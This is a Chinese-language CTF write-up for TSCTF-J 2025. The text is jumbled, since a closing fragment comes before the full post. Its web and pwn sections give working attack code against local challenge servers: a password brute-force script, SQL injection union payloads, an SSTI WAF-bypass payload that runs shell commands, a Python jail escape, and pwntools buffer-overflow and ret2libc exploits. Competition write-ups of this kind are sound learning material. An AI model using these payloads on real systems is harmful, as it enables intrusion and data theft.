打开项目\n\n启动程序，然后\"文件\"-\\>\"从电脑中打开\"\n\n![alt text](image-60.png)\n\n3.  查看代码逻辑\n\n![alt text](image-61.png)\n\n额......这有加密逻辑？输入都没找到啊，不会被隐藏了吧......\n\n如果你有这种想法，那就和我掉进一个坑里了\n\n我们可以看看.sb3（本质是.zip）里面的project.json，你其实会发现：它的代码是按人物存储的！比如下图，上面的blocks里面存储的就是\"角色1\"的代码，下面的blocks则是\"角色3\"的。那我们怎么看其他代码呢？\n\n![alt text](image-62.png)\n\n没错，在右边选其他角色就好了\n\n![alt text](image-63.png)\n\n![alt text](image-64.png)\n\n（没错，就是这么简单粗暴）\n\n接下来就是还原代码逻辑了，不过可能确实有一段逻辑（orc-\\>arc），通过简单测试，可以恢复，下面是用python重写的逻辑（有一些太啰嗦了，直接改写了，原逻辑被注释了）：\n\n```python\nsrc = [211, 717, 210, 132, 193, 114, 244, 208, 213, 99, 37, 214, 224, 101, 98, 212, 224, 118]\n\n# 消息1\norc = []\narc = []\nindex = 1\nend = 0\nwhile end != 1:\n    answer = input()\n    if answer == '#':\n        end = 1\n    else:\n        orc.append(answer)\n        index += 1\n\n# nonomi\n# 没有找到ToKo触发逻辑，根据调试，恢复如下\narc = [114] + [ord(c)+1 for c in orc]\n\nyindex = 1\nwhile yindex <= len(arc) +1:\n    # Shiroko\n    def Bravo(Amy): # 就是(值+项数)%255\n        global iNdex\n        iNdex = yindex\n        ij = arc[iNdex-1]\n        kl = ij + Amy\n        if kl > 255:\n            mn = kl-255\n        else:\n            mn = kl\n        return mn\n    arc[iNdex-1] = Bravo(yindex)\n    yindex += 1 # PDF的WP这里好像漏了一行\n\nyindex = 2\nwhile yindex <= len(arc) +1:\n    # murasame\n    def Charlie(Alice, Bob): # 就是异或\n        # ret = 0\n        # v1 = round(Alice)\n        # v2 = round(Bob)\n        # v5 = 1\n        # while not (v1 == v2 == 0):\n        #     v3 = v1 % 2\n        #     v4 = v2 % 2\n        #     v6 = (v3+v4) % 2\n        #     ret += v5*v6\n        #     v1 //= 2\n        #     v2 //= 2\n        #     v5 *= 2\n        # return ret\n        return Alice ^ Bob\n    arc[yindex-1] = Charlie(arc[yindex-1], arc[yindex-2])\n    yindex += 1\n\nyindex = 1\nwhile yindex <= len(arc) +1:\n    # abstruse\n    # def Delta(Masking):\n    #     return Masking % 16 * 16\n    # def Echo(Layer):\n    #     return Layer // 16\n    # def Foxfort(ChuChu, Pareo):\n    #     return Charlie(ChuChu, Pareo)\n    # arc[yindex-1] = Foxfort(Delta(arc[yindex-1]),Echo(arc[yindex-1]))\n    tmp = arc[yindex-1]\n    arc[yindex-1] = (tmp>>4)|((tmp&0xf)<<4)\n    yindex += 1\n\nyindex = 2\nwhile yindex <= len(arc) +1:\n    # XiaoYuan\n    def Hotel(Lock):\n        if arc[Lock-1] != src[Lock-2]:\n            exit(-1)\n    if len(src) != len(arc)-1:\n        exit(-1)\n    else:\n        Hotel(yindex)\n\nprint('FLAG:', ''.join(arc))\n```\n\n大致加密过程是：转序号、值加编号、前后异或、交换高低位\n\n所以给出解密代码：\n\n```python\nsrc0 = [211, 71, 210, 132, 193, 114, 244, 208, 213, 99, 37, 214, 224, 101, 98, 212, 224, 118]\n\nsrc = [114]+[(v>>4)|((v&0xf)<<4) for v in src0]\n\ndst = []\nwhile len(src) > 1:\n    num = src.pop()\n    dst.append(num^src[-1])\ndst = src + dst[::-1]\n\nori = [(c-i-1-1)%255 for i, c in enumerate(dst)]\n\nprint(bytes(ori))\n```\n\n![alt text](image-65.png)（p对应114）\n\n<box>TSCTF-J{LET_M3_8E_W1TH_Y0U}</box>\n\n## 【附】JustReverse的代码（失败品）：\n\n```python\nimport numpy as np\n\nn = 58\n\nimport torch\nimport torch.nn as nn\nclass Net(nn.Module):\n    def __init__(self):\n        super(Net, self).__init__()\n        self.linear = nn.Linear(n, n*n)\n        self.conv1=nn.Conv2d(1, 1, (2, 2), stride=2)\n        self.conv2=nn.Conv2d(1, 1, (1, 1), stride=1)\n        self.conv3=nn.Conv2d(1, 1, (2, 2), stride=1, padding=1)\n        self.relu=nn.ReLU()\n\n    def forward(self, x):\n        x = x.view(1, 1, 2, 2*n)\n        x = self.conv1(x)\n        x = self.relu(x)\n        x = self.conv2(x)\n        x = x.view(n)\n        x = self.linear(x)\n        x = x.view(1, 1, n, n)\n        x = self.conv3(x)\n        return x\n\nmynet=Net()\nmynet.load_state_dict(torch.load('model.pth'))\n\nout = list(map(lambda line: list(map(float, line.split(' '))), open('ciphertext.txt').readlines()))\n\nout = np.array(out)\n\nout -= mynet.conv3.bias.detach().numpy()\n\n# print(out)\n\ndef reverse_conv(kernel, after, before_size):\n    last_line = [0] + [0] * before_size + [0]\n    before = []\n    for i in range(before_size):\n        line = [0]\n        for j in range(before_size):\n            line.append((after[i][j] - kernel[0][0] * last_line[j] - kernel[0][1] * last_line[j+1] - kernel[1][0] * 0)/kernel[1][1])\n        last_line = line + [0]\n        before.append(line[1:])\n    return before\n\noutl = reverse_conv(mynet.conv3.weight.detach().numpy().reshape((2, 2)).tolist(), out.tolist(), n)\n\n# print(outl)\n\nlb = mynet.linear.bias.detach().numpy()\nlw = mynet.linear.weight.detach().numpy()\n\n# print(lb.shape)\n# print(lw.shape)\n\nout2 = np.linalg.inv(lw.T @ lw) @ (lw.T @ (np.array(outl).reshape((-1)) - lb))\n\n# print(out2)\n\nout1 = (out2 - mynet.conv2.bias.detach().numpy()) / mynet.conv2.weight.detach().numpy()\n\n# print(out1)\n\nw1 = mynet.conv1.weight.detach().numpy()\nb1 = mynet.conv1.bias.detach().numpy()\n\nori = (out1 - b1).reshape((-1))\n\nprint(ori)\najust = [round(i) for i in ori.tolist()]\nprint(ajust)\nb = sum([[i&1, (i&2)//2] for i in ajust], []) + sum([[(i&4)//4, (i&8)//8] for i in ajust], [])\nfor i in range(0, len(b), 8):\n    print(chr(int(''.join(map(str, b[i:i+8])), base=2)), end='', flush=True)\n```\n\n<script>\n  // 修复图炸的情况\n  (new Array(...document.getElementsByTagName('img'))).forEach(\n      img=>{\n          if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n              console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n              img.src=img.src.split('/').slice(-1)\n          }\n  })\n</script>","source":"_posts/TSCTF-J2025-WP.md","raw":"---\ntitle: TSCTF-J2025 WP\ndate: 2025-10-30 22:52:26\ntags:\n---\n\n由于是用Word写的啦，还要转成markdown才能传上来，下面给出PDF版本的WP链接\n\n[TSCTF-J2025 WP](圆周率WP.pdf)\n\n下面的内容与上面一致，但由于转换时的疏忽，可能会：多反斜杠/少反斜杠/多出莫名其妙的星号/多出莫名其妙的换行，请谅解！\n\n最近会抽空对TSCTF-J2025进行复盘，敬请期待~\n\n> 不知道为什么图片路径可能会炸掉，在最后面写了一个简易的修复代码，不能保证一定有用\n> \n> 如果图炸了的话请手动拼接URL，为\n>\n> <span id=\"urlNow\"></span>image-编号.png\n\n<script>\n  document.getElementById(\"urlNow\").innerText = location.href.split('#')[0]\n  document.getElementById(\"urlNow\").innerText += location.href.split('#')[0].slice(-1)==='/'?'':'/'\n</script>\n\n## Abstract\n\n### \\[ab\\] The Great\n\n![alt text](image.png)\n<div>\n<img src=\"image-1.png\" style=\"float:right; zoom:0.7\">\n\n这题一开始也是没有思路的，后来放了很多提示，决定好好想一想。\n\n首先看到提示2，要我们写出音名：\n</div>\n\n![alt text](image-2.png)\n\n然后add（+）是一个很重要的提示，如果把ABCD......映射为1234......，那么音符就可以相加了，以第二个音为例：\n\n$$F_{6} + C_{3} = I_{9}$$\n\n由此，我们可以得出两个单词：EINSTEIN EQUATION，再结合提示1，应当以Latex形式写出爱因斯坦方程，故flag为\n\n<style>\n  box {\n    border: 1px solid;\n    padding: 2px;\n    font-weight: bold;\n  }\n</style>\n\n<box>TSCTF-J{E=mc\\^2}</box>\n\n## Misc\n\n### \\[misc\\] Meow\n\n这题一开始没思路，后面做了几题才回来的，因为一眼丁真看到了\"vfnd\"（\"TSC\"的base64是\"VFND\"）\n\n![alt text](image-3.png)\n\n虽然全是Meow，但是根据程序格式，可以猜出：\n\n![alt text](image-4.png)\n\n所以最后输出的是：\n\n![alt text](image-5.png)\n\n结合vfnd，猜测这是大小写反转的base64，进行解码\n\n![alt text](image-6.png)\n\n```\nIn [1]: import base64\n\nIn [2]: t = 'vfndveyTsNSkmv9bBq==xZrFq2fux01LB3Dnztb3iseHFq=='\n\nIn [3]: import string\n\nIn [4]: t = t.translate(str.maketrans(string.ascii_uppercase+string.ascii_lowercase, string.ascii_lowercase+string.ascii_uppercase))\n\nIn [5]: base64.b64decode(t)\n\nOut[5]: b'TSCTF-J{\\n1_Am'\n\nIn [6]: base64.b64decode(t.split('==', 1)[1])\n\nOut[6]: b'_4_CaT_MeowMe0w!!!}'\n```\n\n最后把换行符去掉，就得到了flag\n\n<box>TSCTF-J{1_Am_4_CaT_MeowMe0w!!!}</box>\n\n### \\[misc\\] 卢森堡的秘密\n\n拿到zip和png，先进行binwalk和pngcheck，没有发现异常，考虑LSB，找到一个在线网站：<https://georgeom.net/StegOnline/upload>\n\n![alt text](image-7.png)\n\n找到flag\n\n<box>TSCTF-J{Th3_sEcre7_0f_L$B!}</box>\n\n### \\[misc\\] BadFile\n\n先强烈推荐一个Windows开源软件<https://github.com/QL-Win/QuickLook>，把苹果的QuickLook功能在Windows上复刻了，特别方便！按空格后还可以按上下键翻动\n\n先看txt\n\n经过翻找，发现好像几段泄露文本都有数字？那就启动grep\n\n```sh\ngrep -r -P '\\d'\n```\n\n![alt text](image-8.png)\n\n完美！\n\n下面看wav\n\n经过翻找，发现几段泄露音频都比较长，于是通过时长降序排列，发现前四都是\n\n![alt text](image-9.png)\n\n那......还有一段呢？只好慢慢翻了\n\n翻了好久终于找到了！居然只有1秒？？\n\n![alt text](image-10.png)\n\n\"我的家在北京市朝阳区\"......懂了，马上去线下真实你🤬\n\n最后是pdf\n\n经过翻找，发现恶意文件会弹窗，由于没有想到好的方法，一一查找\n\n![alt text](image-11.png)\n\n最后合成flag\n\n```\nIn [1]: pdf = list(sorted('''8YmxZRca.pdf\n...: mFU1SdVp.pdf\n...: w9V1ZDEd.pdf\n...: xdBqKtxe.pdf\n...: Z8P4DHre.pdf'''.split('\\n')))\n\nIn [2]: txt = list(sorted('''3WQlwSaj.txt\n...: dubZ3AZn.txt\n...: nhlbNxGL.txt\n...: qtFyaGkZ.txt\n...: wlBUCOeg.txt'''.split('\\n')))\n\nIn [3]: wav = list(sorted('''2JuiKL42.wav\n...: 4UjLqeRF.wav\n...: Ew24ldS2.wav\n...: HjRtD6f3.wav\n...: RtUwEgj1.wav'''.split('\\n')))\n\nIn [4]: '_'.join(['_'.join(l) for l in [txt, wav, pdf]])\n\nOut[4]:\n'3WQlwSaj.txt_dubZ3AZn.txt_nhlbNxGL.txt_qtFyaGkZ.txt_wlBUCOeg.txt_2JuiKL42.wav_4UjLqeRF.wav_Ew24ldS2.wav_HjRtD6f3.wav_RtUwEgj1.wav_8YmxZRca.pdf_Z8P4DHre.pdf_mFU1SdVp.pdf_w9V1ZDEd.pdf_xdBqKtxe.pdf'\n\nIn [5]: import hashlib\n\nIn [6]: hashlib.md5(_.encode()).hexdigest()\n\nOut[6]: '0b4a2a6431f6b94b3c1d3d50d0a45aea'\n```\n\n<box>TSCTF-J{0b4a2a6431f6b94b3c1d3d50d0a45aea}</box>\n\n<h3 id=\"misc-PyJail\" style=\"opacity:0.6;\">[misc] PyJail （半成品）</h3>\n\n拿到代码，发现globals受限，AST不允许访问\"\\_\\_\"开头的属性。\n\n一开始打算用反射获得完整环境：（这里157是os.\\_wrap_close的index，以实际情况为准）\n\n```python\n''.__class__.__mro__[1].__subclasses__()[157].__init__.__globals__\n```\n\n那么就需要绕过\"\\_\\_\"，使用Unicode绕过\n\n```python\n''._＿class__._＿mro__[1]._＿subclasses__()[157]._＿init__._＿globals__\n```\n![alt text](image-12.png)\n\n但是此举触发了import钩子，失败，接下来考虑栈帧逃逸\n\n```python\nprint(g:=[*(q:=(q.gi_frame.f_back.f_back.f_globals for _ in [1]))][0])\n```\n\n成功获得globals，但是接下来就没有思路了：\n\n- os.system/popen、subprocess都被ban了\n\n- \\_posixsubprocess不在sys.modules里，也无法被\\_\\_loader\\_\\_加载\n\n- 写WP的时候突然想到会不会在环境变量里，确认了一下，也没有\n\n![alt text](image-13.png)\n\n<box style=\"opacity: 0.6;\">PLACEHOLDER{TA5K_F4ILED}</box>\n\n## AI\n\n### \\[ai\\] Coup\n\n拿到题目还不知道是干什么的，看AI玩了一局才明白：我们要给代表我们的AI玩家写prompt，来指导它赢得比赛，下面给出我的提示词：\n\n```\nYou are a good Coup Game Player, your aim is to earn a lot money then to\ncoup the other player to death while keep you alive\n```\n\n经过测试，一遍拿到flag，但是仍有改进的余地，AI明显把赚钱放在了第一位，只有到10+才会被迫coup别人，可以强调一下两个任务的优先级。\n\nflag是什么来着？不记得了！😰\n\n<box style=\"opacity:0.6;\">PLACEHOLDER{I_forg0t_mY_fl@g}</box>\n\n<h3 id=\"ai-JustReverse\" style=\"opacity: 0.6;\">[ai] JustReverse （失败）</h3>\n\n根据给出的模型和参数，进行反向求解，但是哪里似乎写错了/不够精确，没有求出flag，代码附在最后。\n\n![alt text](image-14.png)\n\n（你总不能跟我讲这个就是flag吧）\n\n<box style=\"opacity: 0.6;\">PLACEHOLDER{T4SK_FA1L3D}</box>\n\n## Web\n\n### \\[web\\] EZ_Login（签到）\n\n一个登录界面，先尝试SQL注入，发现貌似没有注入点。\n\n下面采取爆破，因为有验证码，但好像只要有某一次的session就提交对应的验证码就好了，下面的脚本还是模拟了登录全流程，并且加了连接中断的处理\n\n```python\nimport requests\nimport re\n\ndef crack(pwd):\n\n    s = requests.Session()\n\n    cookies = {\n        # 省略\n    }\n\n    headers = {\n        # 省略\n    }\n\n    response = s.get('http://127.0.0.1:54655/login', cookies=cookies, headers=headers)\n\n    data = {\n        'username': 'admin',\n        'password': pwd,\n        'captcha': ''.join(re.findall(r'(?<=captcha_images/)\\d(?=\\.png)', response.text))\n    }\n\n    response = s.post(\n        'http://127.0.0.1:54655/login',\n        cookies=cookies,\n        headers=headers,\n        data=data,\n    )\n\n    print(re.findall(f'>.*?错误.*?<', response.text))\n    return '错误' not in response.text\n\nfor i, pwd in enumerate(open('D:/PiYuanZhouLv/rockyou.txt')):\n    pwd = pwd.strip()\n    if not pwd.startswith('s'):\n        continue\n    print(i, pwd)\n    while True:\n        try:\n            if crack(pwd):\n                print(\"THE PASSWORD IS\", pwd)\n                exit()\n        except:\n            import time\n            print('Have a rest!')\n            time.sleep(10)\n        else:\n            break\n```\n\n部分代码由<https://curlconverter.com/>生成\n\n运行，得到密码\"simple\"，尝试登录，提示\"非本地管理员\"\n\n![alt text](image-15.png)\n\n由于wsrx，我们的请求的Referer/Origin都是本地地址（就算wsrx会改那我们也无法控制），所以应该是X-Forwarded-For请求头，复制到HTTPie（或者你的请求软件），将X-Forwarded-For改为127.0.0.1\n\n![alt text](image-16.png)\n\n显示登陆成功，但是......我flag呢？！\n\n在这里卡了，直到后面伪造session的时候才知道这个token是有数据的，上<https://www.jwt.io/>看看\n\n![alt text](image-17.png)\n\n看到flag了！\n\n<box>TSCTF-J{w31c0m3_70_7h3_w38_j0urn3y}</box>\n\n### \\[web\\] EZ_SQL\n\n上来先用通用密码 `' or 1=1 #`\n\n看到一大堆垃圾数据，和一个fleg（\n\n![alt text](image-18.png)\n\n好了，下面就是union注入的时候了\n\n![alt text](image-19.png)\n\n列数为三的时候没有报错，说明回显列为3\n\n查表名：\n\n```sql\n' union select 1, 2, (select group_concat(table_name) FROM\ninformation_schema.tables WHERE table_schema = database()) #\n```\n\n![alt text](image-20.png)\n\n发现flag这个表很有可能是我们的目标，查列名：\n\n```sql\n' union select 1, 2, (select group_concat(column_name) FROM\ninformation_schema.columns WHERE table_name='flag') #\n```\n\n![alt text](image-21.png)\n\n最后查flag\n\n```sql\n' union select 1, 2, (select flag from flag) #\n```\n\n![alt text](image-22.png)\n\n诶诶，怎么炸了！经过搜索，发现是编码不一致导致的，所以\n\n```sql\n' union select 1, 2, (select convert(flag using utf8) from flag) #\n```\n\n![alt text](image-23.png)\n\n<box>TSCTF-J{sql_1nj3ct10n_m4573r}</box>\n\n### \\[web\\] EZ_PY\n\n上来先试注入什么的，无果，突然发现网页中的一行注释\n\n![alt text](image-24.png)\n\n访问/source，获得源码\n\n![alt text](image-25.png)\n\n一个SSTI注入点，但是要admin的session，而且有waf\n\n![alt text](image-26.png)\n\n一段熟悉的套路代码（上周0xGame考了），可以原型链污染\n\n![alt text](image-27.png)\n\n所以，我们通过/register进行原型链污染，把app.config\\[\\'SECRET_KEY\\'\\]改成一个已知值，然后伪造session，进行SSTI注入，获得flag\n\n下面开始：\n\n1.  原型链污染\n  ![alt text](image-28.png)\n2.  session伪造+SSTI\n\nsession伪造可以直接去前面提到的jwt.io上构造，现在就是SSTI和绕WAF了。\n\n![alt text](image-29.png)\n\n首先，注入符号被ban了，但是有hello hacker最后被替换\n\n然后把SSTI注入的关键词都ban的差不都了，但！是！下面那些过滤JavaScript的代码就有用了！比如\\_\\_class\\_\\_就可以写成\\_\\_cl<span style=\"opacity:0.6;\">javascript:</span>ass\\_\\_，不过为了过滤flask.g，它把所有带g的都！ban！掉！了！所以通过subclasses找到os.\\_wrap_close再.\\_\\_init\\_\\_.\\_\\_<span style=\"color: red;\">g</span>lobals\\_\\_的路就GG了。虽然没办法直接拿到os，但是我们可以拿到\\_\\_import\\_\\_，然后.popen().read()就ok啦\\~\n\n```\nhello ''.__clajavascript:ss__.__mrjavascript:o__[1].__subcljavascript:asses__()[141].__injavascript:it__.__builjavascript:tins__['__impjavascript:ort__']('ojavascript:s').popjavascript:en('cat /flag').rejavascript:ad() hacker\n```\n\n![alt text](image-30.png)\n\n不对不对，fla<span style=\"color: red;\">g</span>还有一个g，改成fla?使用通配符就好了\n\n![alt text](image-31.png)\n\nok，拿到flag\\~\n\n<box>TSCTF-J{y0u_c0mp1373d_7h3_py_pr0813m}</box>\n\n## Crypto\n\n### \\[crypto\\] Cantor\\'s gifts\n\n题目给出的hint是打乱后的某数后有多少个数比它小与阶乘相乘之和，所以先提取出复合前的这个数，再恢复乱序数列，最后恢复flag。\n\n一开始是通过模从小阶乘开始算的，不知道为什么不对，最后是从大阶乘整除恢复的，上代码：\n\n```python\nhint = 2498752981111460725490082182453813672840574\nhint2 = b'5__r0tfg5f_34rtm__t_0ury0hft0t3n11c_t'\n\nn = len(hint2)\n\nimport functools\n@functools.cache\ndef f(n):\n    if n <= 1:\n        return 1\n    return n * f(n-1)\n\nrenum = []\nfor i in range(n-1):\n    h = hint - sum([rn*f(n-1-j) for j, rn in enumerate(renum)])\n    rn = h // f(n-i-1)\n    renum.append(rn)\nrenum = renum[::-1]\n\nprint(renum)\n\nrebuilt = [1, 0] if renum.pop(0) else [0, 1]\nfor rn in renum:\n    nums = list(sorted(rebuilt))\n    if rn == 0:\n        rebuilt = [nums[0]-1] + rebuilt\n    elif rn == len(nums):\n        rebuilt = [nums[-1]+1] + rebuilt\n    else:\n        rebuilt = [(nums[rn-1]+nums[rn])/2] + rebuilt\nmp = {num: std for std, num in enumerate(sorted(rebuilt))}\nrebuilt = [mp[num] for num in rebuilt]\n\nprint(rebuilt)\n\nmsg = bytearray(hint2)\nfor i, c in zip(rebuilt, hint2):\n    msg[i] = c\n\nprint(msg)\n```\n\n得到flag\n\n<box>TSCTF-J{c4nt0r5_g1ft_f0r_th3_f1r5t_y0u_t0_m3t}</box>\n\n### \\[crypto\\] Sign in\n\n很简单，考察异或的性质：$P\\bigoplus Q\\bigoplus P = (P\\bigoplus P)\\bigoplus Q = Q$\n\n给出代码：\n\n```python\nimport base64, functools\n\nbase64.b64decode(bytes.fromhex(hex(functools.reduce(lambda x, y: x^y,\nmap(lambda z: int(z, 16),\n['a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93',\n'11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f',\n'e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121'])))[2:]))\n```\n\n<box>TSCTF-J{I_like_Crypto}</box>\n\n### \\[crypto\\] p=\\~q\n\n与TSCTF-J2024 ezRSA的part3类似，p、q的特殊关系可以改写为p\\^q的值，然后就可以剪枝。之前ezRSA的时候自己写的程序就炸了，所以核心部分是从网上不记得哪个地方抄的了\n\n```python\nn = 17051407421191257766878232954687995776275810092183184400406052880776283989210979642731778073370935322411364098277851627904479300390445258684605069414401583042318910193017463817007183769745191345053634189302047446965986220310713141272104307300803560476507359063543147558286276881771260972717080160544078251002420560031692800880310702557545555020333582797788637377901506395695115351043959528307703535156759957098992921231240480724115372547821536358993064005667175508572424424498140029596238691489470392031290179060300593482514446687661068760457021164559923920591924277937814270216802997593891640228684835585559706493543\nc = 6853848340403815994585475502319517119889957571722212403728096345969080424626781659085329098693249503884838912886399198433606071464349852827030377680456139046436386063565577131001152891176064224036780277315958771309063181054101040906120879494157473100295607616604515810676954786850526056316144848921849017030095717895244910724234927693999607754055953250981051858498499963202512464388765761597435963200846457903991924487952495202449073962133164877330289865956477568456497103568127103331224273528931042804794039714404647322385366048042459109584024130199496106946124782839099804356052016687352504438568019898976023369460\n\ndef get_pq(n, x):\n    a = [0]\n    b = [0]\n    maskx = 1\n    maskn = 2\n    for i in range(1024):\n        xbit = (x & maskx) >> i\n        nbit = n % maskn\n        t_a = []\n        t_b = []\n        for j in range(len(a)):\n            for aa in range(2):\n                for bb in range(2):\n                    if aa ^ bb == xbit:\n                        tmp2 = n % maskn\n                        tmp1 = (aa * maskn // 2 + a[j]) * (bb * maskn // 2 + b[j]) % maskn\n                        if tmp1 == tmp2:\n                            t_a.append(aa * maskn // 2 + a[j])\n                            t_b.append(bb * maskn // 2 + b[j])\n        maskx *= 2\n        maskn *= 2\n        a = t_a\n        b = t_b\n    for a1, b1 in zip(a, b):\n        if a1 * b1 == n:\n            return a1, b1\n\np, q = get_pq(n, int('1'*1022+'0', 2))\nphi = (p-1)*(q-1)\nd = pow(0x10001, -1, phi)\n\nfrom Crypto.Util.number import long_to_bytes\n\nprint(long_to_bytes(pow(c, d, n)))\n```\n\n<box>TSCTF-J{The_easiest_RSA_key!}</box>\n\n### \\[crypto\\] 野狐禅\n\n考察了Paillier加密体系，此处取$g = n + 1$\n\n先看加密逻辑：\n\n$$\nc = {(g}^{m} \\times r^{n})\\ mod\\ n^{2} \\\\\\\\\n= \\left( (n + 1)^{m} \\times r^{n} \\right)\\ mod\\ n^{2} \\\\\\\\\n= \\left( (mn + 1) \\times r^{n} \\right)\\ mod\\ n^{2}\n$$\n\n由于n、r都知道，所以\n\n$$m = \\frac{\\frac{c}{r^{n}} - 1}{n}\\ mod\\ n^{2}$$\n\n可以直接解密（一开始走歪了，想到同态去了），由于懒了一下，是AI生成的：\n\n```python\nfrom Crypto.Util.number import long_to_bytes\nfrom sympy import Matrix\n\ndef main():\n    with open(\"challenge.txt\", \"r\") as f:\n        lines = f.readlines()\n\n    n = int(lines[0].split(\": \")[1])\n    g = int(lines[1].split(\": \")[1])\n    k = int(lines[2].split(\": \")[1])\n    eqs = int(lines[3].split(\": \")[1])\n\n    ciphertexts = []\n    for i in range(4, 4 + 2 * k):\n        ciphertexts.append(int(lines[i].strip()))\n    \n    raws = []\n    for i in range(4 + 2 * k, 4 + 4 * k):\n        raws.append(int(lines[i].strip()))\n    \n    n2 = n * n\n    y_list = []\n    for i in range(2 * k):\n        c = ciphertexts[i]\n        raw_val = raws[i]\n        r = raw_val % n\n        r_n = pow(r, n, n2)\n        inv_r_n = pow(r_n, -1, n2)\n        temp = (c * inv_r_n) % n2\n        m_val = (temp - 1) // n\n        y_list.append(m_val)\n    \n    A = []\n    b = []\n    for i in range(k):\n        b.append(y_list[k + i])\n        row = []\n        for j in range(k):\n            row.append(y_list[k + i - 1 - j])\n        A.append(row)\n    \n    A_mat = Matrix(A)\n    b_mat = Matrix(b)\n    try:\n        x = A_mat.solve(b_mat)\n    except ValueError:\n        print(\"Matrix is not invertible\")\n        return\n    \n    coeffs = []\n    for i in range(k):\n        val = x[i]\n        if val.is_Integer:\n            coeffs.append(int(val))\n        else:\n            coeffs.append(round(float(val)))\n    \n    for c in coeffs:\n        if c not in [0, 1, 2]:\n            print(f\"Warning: coefficient {c} is not in [0,1,2]\")\n    \n    num = 0\n    for i in range(k):\n        num += coeffs[i] * (3 ** i)\n    \n    flag = long_to_bytes(num)\n    print(flag.decode())\n\nif __name__ == \"__main__\":\n    main()\n```\n\n<box>TSCTF-J{We_sh0u1d_kn0w!}</box>\n\n## Pwn\n\n### \\[pwn\\] ret\n\n先静态分析，发现一个无限溢出和一个后门函数，直接上exp\n\n<div><img src=\"image-32.png\" style=\"float: left;\"><img src=\"image-33.png\" style=\"float: left;\"></div>\n\n```python\nfrom pwn import *\n\nio = connect('127.0.0.1', 41541)\n\nbkd = 0x400676\nret = 0x400501\n\nio.sendafter(b'n!', cyclic(0x10+8)+p64(ret)+p64(bkd))\n\nio.interactive()\n```\n\n![alt text](image-34.png)\n\n<box>TSCTF-J{weLC0ME_to-TH3-WORld_Of-6INaRY-vuLNER@BIlItY0}</box>\n\n<h3 id=\"pwn-pop\" style=\"opacity:0.6;\">[pwn] pop （半成品）</h3>\n\n静态分析，依然是一个无限溢出，但是连system都没有，考虑ret2libc\n\n![alt text](image-35.png)\n\n1.  漏地址\n\n  发现vuln函数有一部分可以利用，可以先用gadget把puts的got传给rdi，接下来跳0x400633，然后获得puts地址和下一次溢出机会\n  ![alt text](image-36.png)\n\n2.  执行system(\\\"/bin/sh\\\")\n\n接下来有了libc，就可以算出system的地址，也可以找到/bin/sh的字符串，然后就可以getshell啦\\~\n\n但是，问题来了，由于vuln的返回方式是leave\nret，两次操作下来相当于栈迁移了，栈跑到奇怪的地方了，试着把栈改到bss，但是没成功（不排除是我太菜了😅），下面给出代码（未成功）\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64', os='linux', log_level='debug')\n\nputs_got = 0x601018\nleak_addr = 0x400633\nedi_ret = 0x400713\nret_only = 0x4004c9\nrbp = 0x601090\n\nio = gdb.debug('./pwn')\nlibc = ELF('libc-2.23.so')\n\nio.sendafter(b'time!\\n',\ncyclic(0x10)+p64(rbp)+p64(edi_ret)+p64(puts_got)+p64(leak_addr)+b'\\n')\n\nputs_real = u64(io.recv(8)[:-1].ljust(8, b'0'))\nlog.debug(f'puts addr: {hex(puts_real)}')\n\nlibc_to_real = lambda x: x - libc.sym['puts'] + puts_real\nlog.debug(f'Libc base: {hex(libc_to_real(0))}')\n\nsystem_real = libc_to_real(libc.sym['system'])\nbin_sh_real = libc_to_real(next(libc.search(b'/bin/sh')))\n\nio.send(cyclic(0x10)+p64(rbp)+p64(edi_ret)+p64(bin_sh_real)+p64(ret_only)+p64(system_real)+b'\\n')\n\nio.interactive()\n```\n\n<box style=\"opacity: 0.6;\">PLACEHOLDER{I_d0nt_kNovv}</box>\n\n~~对了，因为卡这题了，所以后面的pwn都没有看了~~\n\n## Reverse\n\n### \\[re\\] Singin\n\n先静态分析（下面一些函数是我自己命名的）\n\n首先，看到核心逻辑，Buf2是目标，Buf1是加密输出，进do_something看看\n\n![alt text](image-37.png)\n\n![alt text](image-38.png)\n\n这里是一个异或加密，进b64e\n\n![alt text](image-39.png)\n\n一个\"标准\"的base64，但是有一个奇怪的函数，进change_charset\n\n![alt text](image-40.png)\n\n啊哈！这里把标准的字符集改掉了！所以这是一个自定义的base64，下面提取相关数据，因为我比较懒，就运行提取一下啦\\~\n\n![alt text](image-41.png)\n\n↑Buf2的值\n\n变换后的key\n↓\n\n![alt text](image-42.png)\n\n上代码：\n\n```python\nbuf2 = [0x23,0x7C,0x34,0x61,0x32,0x2,0x13,0x3D,0x67,0x12,0x64,0xD,0x37,0x2,0x34,0x14,0x3,0x7A,0x2B,0x69,0x24,0x70,0x34,0x61,0x32,0x70,0x6B,0x76,0x2,0x42,0x28]\n\nkey = 'w/w5t/YF0wUnwoQKwJt='\n\nprint(''.join([chr(c^ord(key[i%len(key)])) for i, c in enumerate(buf2)]))\n```\n\n![alt text](image-43.png)\n\n<box>TSCTF-J{We1c@me_t0_TS_CTF_2025}</box>\n\n### \\[re\\] 听绿的秘密\n\n看了题目描述，还以为是苹果逆向，吓死了\n\n这道题考的是Java的自定义加载class\n\n先用Jadx打开，发现自定义加载了一个类，而主逻辑很可能就在这个类里面，所以第一步是恢复Secret类\n\n![alt text](image-44.png)\n\n看到上面的CustomClassLoader的定义\n\n![alt text](image-45.png)\n\n解密操作是给原文件里面的字节减7，先提取Secret.obf，下面用python完成解密\n\n```python\nopen('Secret.class', 'wb').write(bytes((v - 7)%256 for v in open('Secret.obf', 'rb').read()))\n```\n\n接下来就用jadx打开还原的Secret.class，就能看到图片加密的逻辑了，然后就是解密图片\n\n![alt text](image-46.png)\n\n下面给出解密脚本：\n\n```python\ncontent = open('Where_is_my_cat.png', 'rb').read()\ncat = bytearray(content)\ni2 = 123\nfor i3 in range(len(content)):\n    i7 = content[i3]\n    i = i7\n    i5 = (i3+i2)%8\n    if i5:\n        i6 = ((i>>i5)|(i<<(8-i5))) & 255\n    else:\n        i6 = i\n    i4 = (i6 - i2 - i3 % 251) % 256\n    i2 = (i2 + i7 + 37) & 255\n    cat[i3] = i4\n\nopen('Cat.png', 'wb').write(cat)\n```\n\n![alt text](image-47.png)\n\n获得flag\n\n<box>TSCTF-J{181_c3ntimeTer5?}</box>\n\n### \\[re\\] 